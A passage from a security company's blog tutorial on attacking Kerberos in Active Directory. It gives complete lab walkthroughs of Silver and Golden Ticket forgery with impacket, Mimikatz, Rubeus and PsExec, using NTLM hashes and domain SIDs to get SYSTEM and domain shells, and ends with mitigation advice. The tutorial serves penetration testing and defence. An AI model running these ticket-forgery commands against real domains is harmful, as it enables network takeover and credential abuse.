Microsoft Windows [Versión 6.1.7601]
Copyright (c) 2009 Microsoft Corporation. All rights reserved.

C:\Windows\system32&gt;whoami
nt authority\system

C:\Windows\system32&gt;
</code></pre><p>Execution is similar to PTT attacks, but in this case 
the ticket is created manually. After that, as usual, it is possible to 
set the ticket in the KRB5CCNAME environment variable and use it with 
the <em>-no-pass -k</em> parameters in any of the impacket examples.</p><h4>From Windows</h4><p>In Windows, <a href="https://github.com/gentilkiwi/mimikatz">Mimikatz</a>
 can be used to craft the ticket. Next, the ticket is injected with 
Rubeus, and finally a remote shell can be obtained thanks to PsExec. It 
must be taken into account that tickets can be forged in a local 
machine, which is not in the target network, and after that send it to a
 machine in the network to inject it. An execution example is shown 
below:</p><pre><code class="language-shell">C:\Users\triceratops&gt;.\mimikatz.exe

  .#####.   mimikatz 2.1.1 (x64) built on Mar 18 2018 00:21:25
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       &gt; https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        &gt; https://pingcastle.com / https://mysmartlogon.com   ***/

mimikatz # kerberos::golden /domain:jurassic.park /sid:S-1-5-21-1339291983-1349129144-367733775 /rc4:b18b4b218eccad1c223306ea1916885f /user:stegosaurus /service:cifs /target:labwws02.jurassic.park
User      : stegosaurus
Domain    : jurassic.park (JURASSIC)
SID       : S-1-5-21-1339291983-1349129144-367733775
User Id   : 500
Groups Id : *513 512 520 518 519
ServiceKey: b18b4b218eccad1c223306ea1916885f - rc4_hmac_nt
Service   : cifs
Target    : labwws02.jurassic.park
Lifetime  : 28/02/2019 13:42:05 ; 25/02/2029 13:42:05 ; 25/02/2029 13:42:05
-&gt; Ticket : ticket.kirbi

 * PAC generated
 * PAC signed
 * EncTicketPart generated
 * EncTicketPart encrypted
 * KrbCred generated

Final Ticket Saved to file !

mimikatz # exit
Bye!
C:\Users\triceratops&gt;.\Rubeus.exe ptt /ticket:ticket.kirbi

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v1.3.3


[*] Action: Import Ticket
[+] Ticket successfully imported!

C:\Users\triceratops&gt;.\PsExec.exe -accepteula \\labwws02.jurassic.park cmd

PsExec v2.2 - Execute processes remotely
Copyright (C) 2001-2016 Mark Russinovich
Sysinternals - www.sysinternals.com


Microsoft Windows [Versión 6.1.7601]
Copyright (c) 2009 Microsoft Corporation. All rights reserved.

C:\Windows\system32&gt;whoami
jurassic\stegosaurus

C:\Windows\system32&gt;
</code></pre><p>Additionally, the Mimikatz module <em>kerberos::ptt</em> can be used to inject the ticket instead of using Rubeus, as shown in the PTT attack section.</p><h3>Golden ticket</h3><p>The
 Golden ticket technique is similar to the Silver ticket one, however, 
in this case a TGT is crafted by using the NTLM hash of the krbtgt AD 
account. The advantage of forging a TGT instead of TGS is being able to 
access any service (or machine) in the domain.</p><p>The krbtgt account 
NTLM hash can be obtained from the lsass process or the NTDS.dit file of
 any DC in the domain. It is also possible to get that NTLM through a 
DCsync attack, which can be performed either with the <a href="https://github.com/gentilkiwi/mimikatz/wiki/module-~-lsadump">lsadump::dcsync</a> module of Mimikatz or the impacket example <a href="https://github.com/SecureAuthCorp/impacket/blob/master/examples/secretsdump.py">secretsdump.py</a>. Usually, domain admin privileges or similar are required, no matter what technique is used.</p><h4>From Linux</h4><p>The
 way to forge a Golden Ticket is very similar to the Silver Ticket one. 
The main differences are that, in this case, no service SPN must be 
specified to ticketer.py, and the krbtgt ntlm hash must be used:</p><pre><code class="language-shell">root@kali:impacket-examples# python ticketer.py -nthash 25b2076cda3bfd6209161a6c78a69c1c -domain-sid S-1-5-21-1339291983-1349129144-367733775 -domain jurassic.park stegosaurus
Impacket v0.9.18 - Copyright 2018 SecureAuth Corporation

[*] Creating basic skeleton ticket and PAC Infos
[*] Customizing ticket for jurassic.park/stegosaurus
[*] 	PAC_LOGON_INFO
[*] 	PAC_CLIENT_INFO_TYPE
[*] 	EncTicketPart
[*] 	EncAsRepPart
[*] Signing/Encrypting final ticket
[*] 	PAC_SERVER_CHECKSUM
[*] 	PAC_PRIVSVR_CHECKSUM
[*] 	EncTicketPart
[*] 	EncASRepPart
[*] Saving ticket in stegosaurus.ccache
root@kali:impacket-examples# export KRB5CCNAME=/root/impacket-examples/stegosaurus.ccache
root@kali:impacket-examples# python psexec.py jurassic.park/stegosaurus@lab-wdc02.jurassic.park -k -no-pass
Impacket v0.9.18 - Copyright 2018 SecureAuth Corporation

[*] Requesting shares on lab-wdc02.jurassic.park.....
[*] Found writable share ADMIN$
[*] Uploading file goPntOCB.exe
[*] Opening SVCManager on lab-wdc02.jurassic.park.....
[*] Creating service DMmI on lab-wdc02.jurassic.park.....
[*] Starting service DMmI.....
[!] Press help for extra shell commands
Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserved.

C:\Windows\system32&gt;whoami
nt authority\system

C:\Windows\system32&gt;
</code></pre><p>The result is similar to the Silver Ticket one, but this
 time, the compromised server is the DC, and could be any machine or the
 domain.</p><h4>From Windows</h4><p>As in silver ticket case, Mimikatz, Rubeus and PsExec can be used to launch the attack:</p><pre><code class="language-shell">C:\Users\triceratops&gt;.\mimikatz.exe

  .#####.   mimikatz 2.1.1 (x64) built on Mar 18 2018 00:21:25
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       &gt; https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        &gt; https://pingcastle.com / https://mysmartlogon.com   ***/

mimikatz # kerberos::golden /domain:jurassic.park /sid:S-1-5-21-1339291983-1349129144-367733775 /rc4:25b2076cda3bfd6209161a6c78a69c1c /user:stegosaurus
User      : stegosaurus
Domain    : jurassic.park (JURASSIC)
SID       : S-1-5-21-1339291983-1349129144-367733775
User Id   : 500
Groups Id : *513 512 520 518 519
ServiceKey: 25b2076cda3bfd6209161a6c78a69c1c - rc4_hmac_nt
Lifetime  : 28/02/2019 10:58:03 ; 25/02/2029 10:58:03 ; 25/02/2029 10:58:03
-&gt; Ticket : ticket.kirbi

 * PAC generated
 * PAC signed
 * EncTicketPart generated
 * EncTicketPart encrypted
 * KrbCred generated

Final Ticket Saved to file !

mimikatz # exit
Bye!
C:\Users\triceratops&gt;.\Rubeus.exe ptt /ticket:ticket.kirbi

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v1.3.3


[*] Action: Import Ticket
[+] Ticket successfully imported!

C:\Users\triceratops&gt;klist

Current LogonId is 0:0x50ca688

Cached Tickets: (1)

#0&gt;     Client: stegosaurus @ jurassic.park
        Server: krbtgt/jurassic.park @ jurassic.park
        KerbTicket Encryption Type: RSADSI RC4-HMAC(NT)
        Ticket Flags 0x40e00000 -&gt; forwardable renewable initial pre_authent
        Start Time: 2/28/2019 11:36:55 (local)
        End Time:   2/25/2029 11:36:55 (local)
        Renew Time: 2/25/2029 11:36:55 (local)
        Session Key Type: RSADSI RC4-HMAC(NT)
        Cache Flags: 0x1 -&gt; PRIMARY
        Kdc Called:

C:\Users\triceratops&gt;.\PsExec.exe -accepteula \\lab-wdc02.jurassic.park cmd

PsExec v2.2 - Execute processes remotely
Copyright (C) 2001-2016 Mark Russinovich
Sysinternals - www.sysinternals.com


Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserved.

C:\Windows\system32&gt;whoami
jurassic\stegosaurus

C:\Windows\system32&gt;
</code></pre><p>While I was performing this technique, sometimes seems 
that tickets doesn’t work. I was wondering what is happening, when I 
remembered reading <a href="https://passing-the-hash.blogspot.com.es/2014/09/pac-validation-20-minute-rule-and.html">this post</a>
 about the 20 minute rule for PAC validation in the DC. Then I realized 
that any of the failed ticket were injected after I having been 
performing some unrelated tasks, which it involves that between the 
moment I created the ticket and the moment I injected it, at least half 
an hour had passed. So, remember to inject the tickets after creating 
them.</p><h3>Mitigations</h3><p>In order to prevent or mitigate many of 
these Kerberos attacks a series of policies can be implemented. Some 
examples are the following:</p><ul><li><strong>Enable an strong password policy</strong>:
 First step is to avoid having weak passwords in domain user accounts. 
To achieve this an strong password policy should be implemented, by 
ensuring that complex password option is enabled on Active Directory 
domain. Moreover, blacklisting some common predictable terms in 
passwords as company names, year or months names.</li><li><strong>Avoid accounts without pre-authentication</strong>:
 If it is no completely necessary, none account must have Kerberos 
pre-authentication enabled. In case that this cannot be avoided, take 
note of these special accounts and create pseudo-random passwords with 
high level of complexity.</li><li><strong>Avoid executing services in behalf of account accounts</strong>:
 Avoid services that run in domain user account context. In case of 
using an special user account for launch domain services, generate an 
strong pseudo-random password for that account.</li><li><strong>Verify PAC</strong>: Enable PAC verification in order to avoid attacks such as Silver Ticket. To enable this check set the value <em>ValidateKdcPacSignature</em> (DWORD) in subkey <em>HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa\Kerberos\Parameters</em> to 1.</li><li><strong>Change passwords periodically</strong>: Set policies to ensure that user passwords are periodically modified, for example, each 2 to 4 months. As special case, <em>krbtgt</em> account password should also be changed periodically, since that key is used to create TGTs. To this purpose, the script <a class="url" href="https://gallery.technet.microsoft.com/Reset-the-krbtgt-account-581a9e51" target="_blank" rel="noopener noreferrer">https://gallery.technet.microsoft.com/Reset-the-krbtgt-account-581a9e51</a> can be used. It must be taken into account that <em>krbtgt</em>
 password must be modified twice to invalidate current domain tickets, 
for cache reasons. Another consideration is that the functional level of
 domain must be equal or higher than Windows Server 2008 in order to 
manipulate <em>krbtgt</em> account credentials.</li><li><strong>Disable Kerberos weak encryption types</strong>:
 Only Kerberos encryption with AES keys should be allowed. Furthermore, 
Kerberos requests with a lower level of encryption as RC4 should be 
monitored, due is usually used by attack tools.</li></ul><p>Additionally,
 Microsoft has published a guide which explains more detailed ways of 
preventing and mitigations this sort of attacks. It can be downloaded at
 <a class="url" href="https://www.microsoft.com/en-us/download/details.aspx?id=36036" target="_blank" rel="noopener noreferrer">https://www.microsoft.com/en-us/download/details.aspx?id=36036</a>.</p><h3>Conclussion</h3><p>As
 it has already been shown, Kerberos has an enormous attack surface that
 can be used by possible attackers. Therefore, it is necessary to be 
aware of these attack techniques in order to deploy a set of security 
policies that avoid and mitigate them.</p><p>However, the journey is not
 over yet. Until now, only direct attacks have been seen, and there is a
 Kerberos feature that allows to expand its surface: Delegation.</p><p>Therefore,
 the next post of this series will try to explain this feature and how 
it can be abused to steal and compromise domain accounts.</p><h3>References</h3><ul><li>MS-KILE: <a class="url" href="https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-kile/2a32282e-dd48-4ad9-a542-609804b02cc9" target="_blank" rel="noopener noreferrer">https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-kile/2a32282e-dd48-4ad9-a542-609804b02cc9</a></li><li>Impacket: <a class="url" href="https://github.com/SecureAuthCorp/impacket" target="_blank" rel="noopener noreferrer">https://github.com/SecureAuthCorp/impacket</a></li><li>Mimikatz: <a class="url" href="https://github.com/gentilkiwi/mimikatz" target="_blank" rel="noopener noreferrer">https://github.com/gentilkiwi/mimikatz</a></li><li>Rubeus: <a class="url" href="https://github.com/GhostPack/Rubeus" target="_blank" rel="noopener noreferrer">https://github.com/GhostPack/Rubeus</a></li><li>Rubeus (with brute module): <a class="url" href="https://github.com/Zer1t0/Rubeus" target="_blank" rel="noopener noreferrer">https://github.com/Zer1t0/Rubeus</a></li><li>Invoke-Kerberoast: <a class="url" href="https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/Invoke-Kerberoast.ps1" target="_blank" rel="noopener noreferrer">https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/Invoke-Kerberoast.ps1</a></li><li>Kerbrute.py: <a class="url" href="https://github.com/TarlogicSecurity/kerbrute" target="_blank" rel="noopener noreferrer">https://github.com/TarlogicSecurity/kerbrute</a></li><li>ticket_converter.py: <a class="url" href="https://github.com/Zer1t0/ticket_converter" target="_blank" rel="noopener noreferrer">https://github.com/Zer1t0/ticket_converter</a></li><li>Tickey: <a class="url" href="https://github.com/TarlogicSecurity/tickey" target="_blank" rel="noopener noreferrer">https://github.com/TarlogicSecurity/tickey</a></li><li>Kerberos Credential Thievery (GNU/Linux): <a class="url" href="https://www.delaat.net/rp/2016-2017/p97/report.pdf" target="_blank" rel="noopener noreferrer">https://www.delaat.net/rp/2016-2017/p97/report.pdf</a></li><li>Fun with LDAP and Kerberos in AD environments: <a class="url" href="https://speakerdeck.com/ropnop/fun-with-ldap-kerberos-and-msrpc-in-ad-environments?slide=79" target="_blank" rel="noopener noreferrer">https://speakerdeck.com/ropnop/fun-with-ldap-kerberos-and-msrpc-in-ad-environments?slide=79</a></li><li>20 Minute Rule PAC: <a class="url" href="https://passing-the-hash.blogspot.com.es/2014/09/pac-validation-20-minute-rule-and.html" target="_blank" rel="noopener noreferrer">https://passing-the-hash.blogspot.com.es/2014/09/pac-validation-20-minute-rule-and.html</a></li><li>Mimikatz and your credentials: <a class="url" href="https://www.nosuchcon.org/talks/2014/D2_02_Benjamin_Delpy_Mimikatz.pdf" target="_blank" rel="noopener noreferrer">https://www.nosuchcon.org/talks/2014/D2_02_Benjamin_Delpy_Mimikatz.pdf</a></li><li>MIT Kerberos Credential cache types: <a class="url" href="https://web.mit.edu/kerberos/krb5-devel/doc/basic/ccache_def.html" target="_blank" rel="noopener noreferrer">https://web.mit.edu/kerberos/krb5-devel/doc/basic/ccache_def.html</a></li><li>MIT Kerberos File ccache format: <a class="url" href="https://web.mit.edu/kerberos/krb5-devel/doc/formats/ccache_file_format.html" target="_blank" rel="noopener noreferrer">https://web.mit.edu/kerberos/krb5-devel/doc/formats/ccache_file_format.html</a></li><li>Detecting Kerberoasting: <a class="url" href="https://adsecurity.org/?p=3458" target="_blank" rel="noopener noreferrer">https://adsecurity.org/?p=3458</a></li></ul><div class="post_series"><div class="post_series__title">More articles in this series about Kerberos</div><p>This article is part of a series of articles about Kerberos</p><ol><li><a href="https://www.tarlogic.com/en/blog/how-kerberos-works/">Kerberos (I): How does Kerberos work? – Theory</a></li><li>Kerberos (II): How to attack Kerberos?</li><li><a href="https://www.tarlogic.com/en/blog/kerberos-iii-how-does-delegation-work/">Kerberos (III): How does delegation work?</a></li></ol></div><div class="share_article"><p>Share this article</p><div class="share_article__buttons"> <a class="facebook" href="https://www.facebook.com/sharer.php?u=https://www.tarlogic.com/en/blog/how-to-attack-kerberos/" target="_blank" rel="noopener noreferrer nofollow"><span class="share_article__buttons_text">Facebook</span></a> - <a class="twitter" href="https://twitter.com/share?text=Kerberos%20(II):%20How%20to%20attack%20Kerberos?&amp;url=https://www.tarlogic.com/en/blog/how-to-attack-kerberos/" target="_blank" rel="noopener noreferrer nofollow"><span class="share_article__buttons_text">Twitter</span></a> - <a class="linkedin" href="https://www.linkedin.com/shareArticle?mini=true&amp;url=https://www.tarlogic.com/en/blog/how-to-attack-kerberos/&amp;title=Kerberos%20(II):%20How%20to%20attack%20Kerberos?&amp;summary=In%20this%20article%20about%20Kerberos,%20the%20following%20attacks%20against%20the%20protocol%20will%20be%20explained:%20Kerberos%20brute-force,%20ASREPRoast,%20Kerberoasting,%20Pass%20the%20key,%20Pass%20the%20ticket,%20Silver%20ticket%20and%20Golden%20ticket." target="_blank" rel="noopener noreferrer nofollow"><span class="share_article__buttons_text">Linkedin</span></a></div></div></div></article><aside class="section section--bg-gray"><h5 class="section__title">Related Posts</h5><div class="tar_wrapper"><div class="tar_column-4"><link data-minify="1" rel="stylesheet" id="tar_thumb_post_product-css" href="Kerberos%20(II):%20How%20to%20attack%20Kerberos%3F%20-%20Tarlogic%20Security%20-%20Cyber%20Security%20and%20Ethical%20hacking_files/thumb_post_product-6613fbd43f3b8fc18e8cbf02a2a8dc1b.css" type="text/css" media="all"><div class="thumb__wrapper"> <a href="https://www.tarlogic.com/en/blog/attacking-selenium-grid/" class="thumb__img_wrapper"> <img src="data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" data-src="https://www.tarlogic.com/wp-content/uploads/2019/04/selenium.png" alt="Attacking QA platforms: Selenium Grid" class="teaser lazyload thumb__img"> <span class="thumb__button">+</span> </a><h4 class="thumb__title"> <a href="https://www.tarlogic.com/en/blog/attacking-selenium-grid/" class="thumb__title_link">Attacking QA platforms: Selenium Grid</a></h4> <span class="thumb__date"><time datetime="2019-04-09">09 - April - 2019</time></span></div></div><div class="tar_column-4"><div class="thumb__wrapper"> <a href="https://www.tarlogic.com/en/blog/protection-privilege-escalation/" class="thumb__img_wrapper"> <img src="data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" data-src="https://www.tarlogic.com/wp-content/uploads/2017/06/protection-escalation.png" alt="Protection against network privilege escalation" class="teaser lazyload thumb__img"> <span class="thumb__button">+</span> </a><h4 class="thumb__title"> <a href="https://www.tarlogic.com/en/blog/protection-privilege-escalation/" class="thumb__title_link">Protection against network privilege escalation</a></h4> <span class="thumb__date"><time datetime="2017-06-20">20 - June - 2017</time></span></div></div><div class="tar_column-4"><div class="thumb__wrapper"> <a href="https://www.tarlogic.com/en/blog/platform-in-the-middle-bypassing-drm-protections-at-content-delivery-networks/" class="thumb__img_wrapper"> <img src="data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" data-src="https://www.tarlogic.com/wp-content/uploads/2015/04/imagen_entrada_3.jpg" alt="Platform in the Middle &amp;#8211; Bypassing DRM protections at Content Delivery Networks" class="teaser lazyload thumb__img"> <span class="thumb__button">+</span> </a><h4 class="thumb__title"> <a href="https://www.tarlogic.com/en/blog/platform-in-the-middle-bypassing-drm-protections-at-content-delivery-networks/" class="thumb__title_link">Platform in the Middle – Bypassing DRM protections at Content Delivery Networks</a></h4> <span class="thumb__date"><time datetime="2015-05-18">18 - May - 2015</time></span></div></div></div></aside><div class="section"><div id="comments" class="comments-container"><div class="fusion-title fusion-title-size-three sep-double sep-solid" style="margin-top:0px;margin-bottom:31px;"><h3 class="title-heading-left" style="margin:0;"> 3 Comments</h3><div class="title-sep-container"><div class="title-sep sep-double sep-solid"></div></div></div><ol class="comment-list commentlist"><li class="comment even thread-even depth-1" id="comment-23651"><div class="the-comment"><div class="avatar"><img alt="" src="Kerberos%20(II):%20How%20to%20attack%20Kerberos%3F%20-%20Tarlogic%20Security%20-%20Cyber%20Security%20and%20Ethical%20hacking_files/6d2b5e145303600a05851208f02b29cf.jpeg" srcset="https://secure.gravatar.com/avatar/6d2b5e145303600a05851208f02b29cf?s=108&amp;d=mm&amp;r=g 2x" class="avatar avatar-54 photo" width="54" height="54"></div><div class="comment-box"><div class="comment-author meta"> <strong>Smokey</strong> 4 June, 2019 at 4:29 pm<a rel="nofollow" class="comment-reply-link" href="#comment-23651" data-commentid="23651" data-postid="19268" data-belowelement="comment-23651" data-respondelement="respond" aria-label="Reply to Smokey"> - Reply</a></div><div class="comment-text"><p>great reading!!!!!!! thank you for sharing!</p></div></div></div></li><li class="comment odd alt thread-odd thread-alt depth-1" id="comment-23704"><div class="the-comment"><div class="avatar"><img alt="" src="Kerberos%20(II):%20How%20to%20attack%20Kerberos%3F%20-%20Tarlogic%20Security%20-%20Cyber%20Security%20and%20Ethical%20hacking_files/b3a647d93ad37a3943690f7cec5af476.jpeg" srcset="https://secure.gravatar.com/avatar/b3a647d93ad37a3943690f7cec5af476?s=108&amp;d=mm&amp;r=g 2x" class="avatar avatar-54 photo" width="54" height="54"></div><div class="comment-box"><div class="comment-author meta"> <strong>Jesse</strong> 7 June, 2019 at 5:12 am<a rel="nofollow" class="comment-reply-link" href="#comment-23704" data-commentid="23704" data-postid="19268" data-belowelement="comment-23704" data-respondelement="respond" aria-label="Reply to Jesse"> - Reply</a></div><div class="comment-text"><p>HiIt
 looks like the Mimikatz for Windows for Siverticket was accidentally 
replace with the Golden ticket procedure. Is that right? Or am I missing
 something?</p></div></div></div><ul class="children"><li class="comment byuser comment-author-eloy-pereztarlogic-com bypostauthor even depth-2" id="comment-23707"><div class="the-comment"><div class="avatar"><img alt="" src="Kerberos%20(II):%20How%20to%20attack%20Kerberos%3F%20-%20Tarlogic%20Security%20-%20Cyber%20Security%20and%20Ethical%20hacking_files/aef78b0d8eb6bff91accf3fb03a9934b.jpeg" srcset="https://secure.gravatar.com/avatar/aef78b0d8eb6bff91accf3fb03a9934b?s=108&amp;d=mm&amp;r=g 2x" class="avatar avatar-54 photo" width="54" height="54"></div><div class="comment-box"><div class="comment-author meta"> <strong>Eloy Pérez</strong> 7 June, 2019 at 8:28 am<a rel="nofollow" class="comment-reply-link" href="#comment-23707" data-commentid="23707" data-postid="19268" data-belowelement="comment-23707" data-respondelement="respond" aria-label="Reply to Eloy Pérez"> - Reply</a></div><div class="comment-text"><p>Hi,
 thats an excellent question because that command could be a little 
confusing, however it is not a mistake. Mimikatz uses the same command 
(kerberos::golden) to generate silver and golden tickets. It generates 
an TGS or TGT based on the arguments provided, more specifically, if you
 provide the service parameter, then a TGS will be generated. There is 
more information in <a href="https://github.com/gentilkiwi/mimikatz/wiki/module-~-kerberos#golden--silver" rel="nofollow ugc">https://github.com/gentilkiwi/mimikatz/wiki/module-~-kerberos#golden–silver</a>.</p></div></div></div></li></ul></li><li class="comment odd alt thread-even depth-1" id="comment-31239"><div class="the-comment"><div class="avatar"><img alt="" src="Kerberos%20(II):%20How%20to%20attack%20Kerberos%3F%20-%20Tarlogic%20Security%20-%20Cyber%20Security%20and%20Ethical%20hacking_files/87931f93e04cc10cea22271aaba78270.jpeg" srcset="https://secure.gravatar.com/avatar/87931f93e04cc10cea22271aaba78270?s=108&amp;d=mm&amp;r=g 2x" class="avatar avatar-54 photo" width="54" height="54"></div><div class="comment-box"><div class="comment-author meta"> <strong>cionsystems</strong> 12 February, 2020 at 5:19 pm<a rel="nofollow" class="comment-reply-link" href="#comment-31239" data-commentid="31239" data-postid="19268" data-belowelement="comment-31239" data-respondelement="respond" aria-label="Reply to cionsystems"> - Reply</a></div><div class="comment-text"><p>Thanks for sharing Active directory auditor tips. for more info i rfer cion systems Active directory auditor in USA.</p></div></div></div></li><li class="comment even thread-odd thread-alt depth-1" id="comment-51525"><div class="the-comment"><div class="avatar"><img alt="" src="Kerberos%20(II):%20How%20to%20attack%20Kerberos%3F%20-%20Tarlogic%20Security%20-%20Cyber%20Security%20and%20Ethical%20hacking_files/16c2f3253452492e8e28c44e4c7e3bac.jpeg" srcset="https://secure.gravatar.com/avatar/16c2f3253452492e8e28c44e4c7e3bac?s=108&amp;d=mm&amp;r=g 2x" class="avatar avatar-54 photo" width="54" height="54"></div><div class="comment-box"><div class="comment-author meta"> <strong>Jorko: Wonderchimp</strong> 12 March, 2020 at 4:34 am<a rel="nofollow" class="comment-reply-link" href="#comment-51525" data-commentid="51525" data-postid="19268" data-belowelement="comment-51525" data-respondelement="respond" aria-label="Reply to Jorko: Wonderchimp"> - Reply</a></div><div class="comment-text"><p>Excellent article! Great job of organizing all this data in an easy to read format!</p></div></div></div></li></ol></div><div id="respond" class="comment-respond"><h3 id="reply-title" class="comment-reply-title">Leave a comment <small><a rel="nofollow" id="cancel-comment-reply-link" href="https://www.tarlogic.com/en/blog/how-to-attack-kerberos/#respond" style="display:none;">Cancel reply</a></small></h3><form action="https://www.tarlogic.com/wp-comments-post.php" method="post" id="commentform" class="comment-form"><div id="comment-textarea"><textarea name="comment" id="comment" cols="45" rows="8" aria-required="true" required="required" tabindex="0" class="textarea-comment"></textarea><label for="comment">Your comment</label><span></span></div><input name="wpml_language_code" type="hidden" value="en"><div id="comment-input"><div class="comment-input"><input id="author" name="author" type="text" size="30" aria-required="true" required="required"><label for="author">Your name</label><span></span></div><div class="comment-input"><input id="email" name="email" type="email" size="30" aria-required="true" required="required"><label for="email">Your email</label><span></span></div><div class="comment-input"><input id="url" name="url" type="url" size="30"><label for="url">Web site</label><span></span></div></div><p class="comment-form-cookies-consent"><input id="wp-comment-cookies-consent" name="wp-comment-cookies-consent" type="checkbox" value="yes"> <label for="wp-comment-cookies-consent">Save my name, email, and website in this browser for the next time I comment.</label></p><p class="form-submit"><input name="submit" type="submit" id="comment-submit" class="fusion-button fusion-button-default" value="Your comment"> <input type="hidden" name="comment_post_ID" value="19268" id="comment_post_ID"> <input type="hidden" name="comment_parent" id="comment_parent" value="0"></p><p style="display: none;"><input type="hidden" id="akismet_comment_nonce" name="akismet_comment_nonce" value="2ad36ee380"></p><p style="display: none;"></p><input type="hidden" id="ak_js" name="ak_js" value="1599818956879"></form></div></div></section></main><footer><div class="breadcrumbs_social__bar"><ul class="social__list"><li class="social_item social_item--linkedin"> <a href="https://www.linkedin.com/company/tarlogic" class="section__link" rel="nofollow" title="Linkedin" aria-label="Linkedin">Linkedin</a></li><li class="social_item social_item--twitter"> <a href="https://twitter.com/tarlogic?lang=es" class="section__link" rel="nofollow" title="Twitter" aria-label="Twitter">Twitter</a></li></ul></div><div class="mapa__title"> <span>Where to find us</span></div><div class="mapa"><div id="footer_map_offices" style="height: 450px;width: 100%;position: relative;overflow: hidden;"></div></div><nav id="footer__menu"><ul class="footer__menu"><li id="menu-item-20084" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-20084"><a href="https://www.tarlogic.com/en/cybersecurity-company/">Company</a></li><li id="menu-item-20085" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-20085"><a href="https://www.tarlogic.com/politica-de-privacidad/">Privacy Policy</a></li><li id="menu-item-20086" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-20086"><a href="https://www.tarlogic.com/aviso-legal/">Legal Advice</a></li><li id="menu-item-20087" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-20087"><a href="https://www.tarlogic.com/politica-de-calidad/">Quality Policy</a></li><li id="menu-item-20937" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-20937"><a href="https://www.tarlogic.com/en/cybersecurity-products/">Products</a></li><li id="menu-item-20089" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-20089"><a href="https://www.tarlogic.com/talento/">Talent</a></li></ul></nav><div class="copyright"><p>© 2019 Tarlogic Security | cyber security, cyber intelligence and Red Team | Computer security and ethical hacking.<br> This web use cookies</p></div></footer><link data-minify="1" rel="stylesheet" id="tar-footer-css" href="Kerberos%20(II):%20How%20to%20attack%20Kerberos%3F%20-%20Tarlogic%20Security%20-%20Cyber%20Security%20and%20Ethical%20hacking_files/footer-d9c4c26e6cffc9925a717798a6466c64.css" type="text/css" media="all"><link rel="stylesheet" id="wp-block-library-css" href="Kerberos%20(II):%20How%20to%20attack%20Kerberos%3F%20-%20Tarlogic%20Security%20-%20Cyber%20Security%20and%20Ethical%20hacking_files/style.css" type="text/css" media="all"><link rel="stylesheet" id="wp-block-library-theme-css" href="Kerberos%20(II):%20How%20to%20attack%20Kerberos%3F%20-%20Tarlogic%20Security%20-%20Cyber%20Security%20and%20Ethical%20hacking_files/theme.css" type="text/css" media="all"> <script data-minify="1" type="text/javascript" src="Kerberos%20(II):%20How%20to%20attack%20Kerberos%3F%20-%20Tarlogic%20Security%20-%20Cyber%20Security%20and%20Ethical%20hacking_files/image_ligthbox-17238f72ba25aa2f780d691b313b12df.js"></script> <script type="text/javascript">var quicklinkOptions = {"el":"","urls":[],"timeout":2000,"timeoutFn":"requestIdleCallback","priority":false,"origins":["www.tarlogic.com"],"ignores":["feed\\=","\\\/feed\\\/","^https?:\\\/\\\/[^\\\/]+\\\/en\\\/blog\\\/how\\-to\\-attack\\-kerberos\\\/(#.*)?$","^https\\:\\\/\\\/www\\.tarlogic\\.com\\\/wp\\-admin\\\/","^https\\:\\\/\\\/www\\.tarlogic\\.com[^?#]+\\.php","\\\/wp\\-content",".*\\?.+"]};</script> <script type="text/javascript" src="Kerberos%20(II):%20How%20to%20attack%20Kerberos%3F%20-%20Tarlogic%20Security%20-%20Cyber%20Security%20and%20Ethical%20hacking_files/quicklink.js" async=""></script> <script type="text/javascript" src="Kerberos%20(II):%20How%20to%20attack%20Kerberos%3F%20-%20Tarlogic%20Security%20-%20Cyber%20Security%20and%20Ethical%20hacking_files/comment-reply.js"></script> <script data-minify="1" type="text/javascript" src="Kerberos%20(II):%20How%20to%20attack%20Kerberos%3F%20-%20Tarlogic%20Security%20-%20Cyber%20Security%20and%20Ethical%20hacking_files/menu_handler-573b34947c4f8c269f896f1474e679e2.js"></script> <script data-minify="1" type="text/javascript" src="Kerberos%20(II):%20How%20to%20attack%20Kerberos%3F%20-%20Tarlogic%20Security%20-%20Cyber%20Security%20and%20Ethical%20hacking_files/mootools-core-yc-2b3bfb6af906078bd90134f1218bf912.js"></script> <script type="text/javascript" src="Kerberos%20(II):%20How%20to%20attack%20Kerberos%3F%20-%20Tarlogic%20Security%20-%20Cyber%20Security%20and%20Ethical%20hacking_files/EnlighterJS.js"></script> <script data-minify="1" type="text/javascript" src="Kerberos%20(II):%20How%20to%20attack%20Kerberos%3F%20-%20Tarlogic%20Security%20-%20Cyber%20Security%20and%20Ethical%20hacking_files/cookies-109960721bcafc31ecedddb9946cbd1e.js"></script> <script data-minify="1" type="text/javascript" 